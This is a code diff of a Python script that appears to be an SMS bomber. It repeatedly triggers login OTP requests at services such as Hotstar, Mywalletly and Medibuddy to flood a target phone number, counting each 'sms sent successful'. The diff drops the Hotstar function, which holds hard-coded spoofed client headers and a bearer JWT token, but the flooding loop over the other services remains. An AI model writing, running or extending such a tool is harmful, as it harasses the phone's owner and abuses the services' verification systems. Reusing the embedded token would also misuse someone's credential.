@@ -18,37 +18,6 @@ def check(number):
     else:
         return True
         
-def hotstar(number):
-    data={
-    "body": {
-    "@type": "type.googleapis.com/feature.login.InitiatePhoneLoginRequest",
-    "phone_number": number,
-    "initiate_by": 0,
-    "recaptcha_token": ""
-    }
-    }
-    headers = { "X-Country-Code":"in",
-    "X-Hs-Accept-Language":
-    "eng",
-    "X-Hs-Client":
-    "platform:web;app_version:23.10.20.4;browser:Chrome;schema_version:0.0.1047",
-    "X-Hs-Client-Targeting":
-    "ad_id:711977-6a27ac-21df19-8c295;user_lat:false",
-    "X-Hs-Device-Id":
-    "711977-6a27ac-21df19-8c295",
-    "X-Hs-Platform":
-    "web",
-    "X-Hs-Request-Id":
-    "8eac10-81d805-8071fd-1b76dc",
-    "X-Hs-Usertoken":
-    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHBJZCI6IiIsImF1ZCI6InVtX2FjY2VzcyIsImV4cCI6MTcwMDM5MzY0MywiaWF0IjoxNjk5Nzg4ODQzLCJpc3MiOiJUUyIsImp0aSI6IjM2MTViZTM3ZTQ4ODQwYWVhNjlkNTgxMDM5YmMzOTJmIiwic3ViIjoie1wiaElkXCI6XCJhZDBlMGE0ZGM4OWE0NzM3YjVlMDljYmUyZWMxMWQwY1wiLFwicElkXCI6XCJmNDU5NjlhN2E0NmQ0YmZiYTEwZjgxM2I0YTg4NDc1ZFwiLFwibmFtZVwiOlwiWW91XCIsXCJpcFwiOlwiNDkuMjA0LjQuMTZcIixcImNvdW50cnlDb2RlXCI6XCJpblwiLFwiY3VzdG9tZXJUeXBlXCI6XCJudVwiLFwidHlwZVwiOlwiZ3Vlc3RcIixcImlzRW1haWxWZXJpZmllZFwiOmZhbHNlLFwiaXNQaG9uZVZlcmlmaWVkXCI6ZmFsc2UsXCJkZXZpY2VJZFwiOlwiNzExOTc3LTZhMjdhYy0yMWRmMTktOGMyOTVcIixcInByb2ZpbGVcIjpcIkFEVUxUXCIsXCJ2ZXJzaW9uXCI6XCJ2MlwiLFwic3Vic2NyaXB0aW9uc1wiOntcImluXCI6e319LFwiaXNzdWVkQXRcIjoxNjk5Nzg4ODQzMTA1LFwiZHBpZFwiOlwiZjQ1OTY5YTdhNDZkNGJmYmExMGY4MTNiNGE4ODQ3NWRcIixcInN0XCI6MSxcImRhdGFcIjpcIkNnUUlBRElBQ2dRSUFFSUFDZ1FJQUJJQUNnUUlBRG9BQ2d3SUFDSUlrQUhNMEwyYXZERUtsQUVJQUNxUEFRb0NDZ0FLQkFvQ0NBSUthUW9IQ0FFVkFBQUFRQklLQ2dOMFlXMGxIMW9GUGhJS0NnTm9hVzRsNGo0RFB4SUtDZ050WVd3bGp6M3JQQklLQ2dOcllXNGxvOVFPUEJJS0NnTmlaVzRsS1ZKMFBSSUtDZ05sYm1jbHM0UkVQUklLQ2dOdFlYSWx5NXNkUFJJS0NnTjBaV3dsc2JneFBnb0xDZ0lJQXhJRkNnTm9hVzRLQ3dvQ0NBUVNCUW9EYUdsdVwifSIsInZlcnNpb24iOiIxXzAifQ.m0caHTOtLogGXOHmfBiWQUcrOLxc8dq1WGPW9I0IDTQ",
-    "X-Request-Id":
-    "8eac10-81d805-8071fd-1b76dc"}
-    url="https://www.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8?action=sendOtp"
-    request= requests.post(url,json=data,headers=headers)
-    print(request.status_code,request.text)
-    if request.status_code==200:
-        return True
         
 def mywalletly(number):
     data={
@@ -257,12 +226,6 @@ def medibuddy(number):
 def main(number,times):
     i=0
     while i<times:
-        if i<times:
-            if hotstar(number):
-                i=i+1
-                print(f"sms sent successful {i}")
-        else:
-            break
         if i<times:
             if mywalletly(number):
                 i=i+1
